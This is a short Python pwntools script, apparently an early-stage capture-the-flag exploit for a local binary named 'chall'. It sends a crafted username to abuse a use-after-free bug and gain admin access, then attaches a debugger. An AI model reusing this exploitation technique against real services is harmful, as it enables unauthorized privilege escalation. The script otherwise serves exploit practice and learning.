from pwn import * 

context.arch="x86_64"

def login(p, username, username_length):

    p.sendlineafter("option: ", "1")
    p.sendlineafter("length: ", str(username_length))
    p.sendlineafter("username: ", username)

def logout(p):

    p.sendlineafter("option: ", "2")

def get_secret_menu(p):

    p.sendlineafter("option: ", "3")

def main():

    HOST = ""
    PORT = 0
    local = True 

    if local:

        p = process("./chall")

    else:

        p = remote(HOST, PORT)

    #======== STEP 1 ===========
    #getting admin access by abusing UAF bug 
    login(p, "A" * 8 + "IS_ADMIN", 16)
    gdb.attach(p)
    p.interactive()

if __name__ == "__main__":

    main()